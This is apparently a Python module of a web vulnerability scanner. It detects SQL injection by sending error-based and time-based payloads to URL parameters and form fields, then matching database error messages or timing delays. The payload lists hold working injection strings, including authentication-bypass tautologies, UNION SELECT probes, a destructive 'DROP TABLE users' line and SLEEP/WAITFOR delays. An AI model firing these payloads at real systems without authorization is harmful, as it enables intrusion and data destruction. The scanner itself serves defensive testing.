"""
SQL Injection Scanner Module

Detects SQL Injection vulnerabilities using:
1. Error-based detection - Looking for database error messages
2. Time-based detection - Measuring response delays from SLEEP/WAITFOR
3. Boolean-based detection - Comparing responses for true/false conditions

SQL Injection allows attackers to:
- Extract sensitive data from databases
- Modify or delete data
- Bypass authentication
- Execute commands on the database server
"""

import re
import time
from typing import Dict, List, Any
from urllib.parse import urlparse, parse_qs

from scanner.base import BaseScanner
from utils.http_helper import (
    inject_payload_in_url,
    inject_payload_in_form,
    extract_params,
    build_url_with_params
)


class SQLInjectionScanner(BaseScanner):
    """
    Scanner for detecting SQL Injection vulnerabilities.
    
    This scanner tests URL parameters and form inputs for SQL injection
    by injecting payloads and analyzing responses for:
    - Database error messages (error-based)
    - Time delays (time-based blind)
    - Response differences (boolean-based)
    """
    
    @property
    def name(self) -> str:
        return "SQL Injection Scanner"
    
    @property
    def severity(self) -> str:
        return "Critical"
    
    def __init__(self, timeout: int = 10, delay: float = 0.5):
        super().__init__(timeout=timeout, delay=delay)
        
        # Error-based SQL injection payloads
        self.error_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1\" --",
            "' OR '1'='1' /*",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "') OR ('1'='1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "1; DROP TABLE users--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "admin'--",
            "admin' #",
            "' OR ''='",
            "' OR 'x'='x",
        ]
        
        # Time-based blind SQL injection payloads
        # These cause the database to wait before responding
        self.time_payloads = [
            ("' OR SLEEP(5)--", 5),
            ("\" OR SLEEP(5)--", 5),
            ("'; WAITFOR DELAY '0:0:5'--", 5),
            ("\"; WAITFOR DELAY '0:0:5'--", 5),
            ("' OR BENCHMARK(5000000, SHA1('test'))--", 4),
            ("1' AND SLEEP(5)--", 5),
            ("1; SELECT SLEEP(5)--", 5),
            ("' OR pg_sleep(5)--", 5),  # PostgreSQL
        ]
        
        # SQL error patterns to detect in responses
        self.error_patterns = [
            # MySQL
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError",
            r"org\.postgresql\.util\.PSQLException",
            
            # Microsoft SQL Server
            r"Driver.* SQL[\-\_\ ]*Server",
            r"OLE DB.* SQL Server",
            r"(\W|\A)SQL Server.*Driver",
            r"Warning.*mssql_",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
            r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
            r"(?s)Exception.*\WRoadhouse\.Cms\.",
            r"Msg \d+, Level \d+, State \d+",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            
            # Oracle
            r"\bORA-[0-9][0-9][0-9][0-9]",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_",
            r"Warning.*\Wora_",
            r"oracle\.jdbc\.driver",
            
            # SQLite
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"Warning.*sqlite_",
            r"Warning.*SQLite3::",
            r"\[SQLITE_ERROR\]",
            r"SQLITE error",
            
            # Generic SQL errors
            r"SQL error.*POS([0-9]+)",
            r"SQL syntax.*",
            r"Warning.*pdo_",
            r"You have an error in your SQL syntax",
            r"Unclosed quotation mark",
            r"quoted string not properly terminated",
            r"Syntax error in string in query expression",
        ]
        
        # Compile error patterns for efficiency
        self.compiled_patterns = [
            re.compile(pattern, re.IGNORECASE) 
            for pattern in self.error_patterns
        ]
    
    def check_sql_errors(self, response_text: str) -> tuple:
        """
        Check response for SQL error messages.
        
        Args:
            response_text: HTTP response body
            
        Returns:
            Tuple of (is_vulnerable, matched_pattern)
        """
        for pattern in self.compiled_patterns:
            match = pattern.search(response_text)
            if match:
                return True, match.group()
        return False, None
    
    def test_error_based(
        self,
        url: str,
        param: str,
        method: str = 'GET',
        form_data: Dict = None
    ) -> List[Dict]:
        """
        Test for error-based SQL injection.
        
        This method injects payloads and looks for SQL error messages
        in the response, which indicate the input is being used in
        a SQL query without proper sanitization.
        
        Args:
            url: Target URL
            param: Parameter to test
            method: HTTP method (GET or POST)
            form_data: Form data for POST requests
            
        Returns:
            List of vulnerabilities found
        """
        vulns = []
        
        for payload in self.error_payloads:
            try:
                if method == 'GET':
                    # Inject payload into URL parameter
                    test_url = inject_payload_in_url(url, param, payload)
                    response = self.make_request(test_url, method='GET')
                else:
                    # Inject payload into form data
                    test_data = form_data.copy() if form_data else {}
                    test_data[param] = payload
                    response = self.make_request(url, method='POST', data=test_data)
                
                if response is None:
                    continue
                
                # Check for SQL errors in response
                is_vulnerable, evidence = self.check_sql_errors(response.text)
                
                if is_vulnerable:
                    self.add_vulnerability(
                        vuln_type="SQL Injection (Error-based)",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence=evidence,
                        severity="Critical",
                        description=(
                            "The application appears to be vulnerable to SQL injection. "
                            "Database error messages were detected in the response, indicating "
                            "that user input is being incorporated into SQL queries without "
                            "proper sanitization."
                        ),
                        recommendation=(
                            "Use parameterized queries (prepared statements) instead of "
                            "string concatenation. Implement input validation and use "
                            "an ORM where possible. Never trust user input."
                        )
                    )
                    vulns.append(self.vulnerabilities[-1])
                    # Found vulnerability, no need to test more payloads for this param
                    break
                
                self.throttle()
                
            except Exception as e:
                self.logger.debug(f"Error testing {url}: {e}")
        
        return vulns
    
    def test_time_based(
        self,
        url: str,
        param: str,
        method: str = 'GET',
        form_data: Dict = None
    ) -> List[Dict]:
        """
        Test for time-based blind SQL injection.
        
        This method injects payloads that cause database delays (like SLEEP)
        and measures response times. A significantly delayed response
        indicates the injection was successful.
        
        Args:
            url: Target URL
            param: Parameter to test
            method: HTTP method (GET or POST)
            form_data: Form data for POST requests
            
        Returns:
            List of vulnerabilities found
        """
        vulns = []
        
        # First, get baseline response time
        baseline_times = []
        for _ in range(2):
            if method == 'GET':
                _, elapsed = self.make_request_timed(url, method='GET')
            else:
                _, elapsed = self.make_request_timed(url, method='POST', data=form_data)
            baseline_times.append(elapsed)
            time.sleep(0.5)
        
        avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 2
        
        for payload, expected_delay in self.time_payloads:
            try:
                if method == 'GET':
                    test_url = inject_payload_in_url(url, param, payload)
                    response, elapsed = self.make_request_timed(test_url, method='GET')
                else:
                    test_data = form_data.copy() if form_data else {}
                    test_data[param] = payload
                    response, elapsed = self.make_request_timed(
                        url, method='POST', data=test_data
                    )
                
                if response is None:
                    continue
                
                # Check if response was significantly delayed
                # The delay should be close to the expected delay
                delay_threshold = avg_baseline + (expected_delay * 0.7)
                
                if elapsed >= delay_threshold:
                    self.add_vulnerability(
                        vuln_type="SQL Injection (Time-based Blind)",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence=f"Response delayed by {elapsed:.2f}s (baseline: {avg_baseline:.2f}s)",
                        severity="Critical",
                        description=(
                            "The application appears to be vulnerable to time-based blind "
                            "SQL injection. The database executed a delay function, indicating "
                            "that arbitrary SQL commands can be executed."
                        ),
                        recommendation=(
                            "Use parameterized queries (prepared statements). "
                            "Implement proper input validation and sanitization. "
                            "Consider using an ORM framework."
                        )
                    )
                    vulns.append(self.vulnerabilities[-1])
                    break
                
                self.throttle()
                
            except Exception as e:
                self.logger.debug(f"Error in time-based test for {url}: {e}")
        
        return vulns
    
    def scan(self, urls: List[str], forms: List[Dict] = None) -> List[Dict]:
        """
        Scan for SQL injection vulnerabilities.
        
        Args:
            urls: List of URLs to scan
            forms: List of forms to test
            
        Returns:
            List of discovered vulnerabilities
        """
        self.vulnerabilities = []
        self.logger.info(f"  Testing {len(urls)} URLs for SQL Injection...")
        
        # Test URL parameters
        for url in urls:
            params = extract_params(url)
            
            for param in params:
                self.logger.debug(f"  Testing parameter: {param} in {url}")
                
                # Error-based testing
                self.test_error_based(url, param, method='GET')
                
                # Time-based testing (more reliable but slower)
                self.test_time_based(url, param, method='GET')
        
        # Test form parameters
        if forms:
            self.logger.info(f"  Testing {len(forms)} forms for SQL Injection...")
            
            for form in forms:
                url = form['action']
                method = form['method']
                
                # Build base form data
                base_data = {}
                for input_field in form['inputs']:
                    if input_field['name']:
                        base_data[input_field['name']] = input_field.get('value', 'test')
                
                # Test each input field
                for input_field in form['inputs']:
                    param = input_field['name']
                    if not param:
                        continue
                    
                    # Skip certain input types
                    if input_field.get('type') in ['submit', 'button', 'image', 'reset', 'hidden']:
                        continue
                    
                    self.logger.debug(f"  Testing form parameter: {param}")
                    
                    # Error-based testing
                    self.test_error_based(url, param, method=method, form_data=base_data)
                    
                    # Time-based testing
                    self.test_time_based(url, param, method=method, form_data=base_data)
        
        return self.vulnerabilities
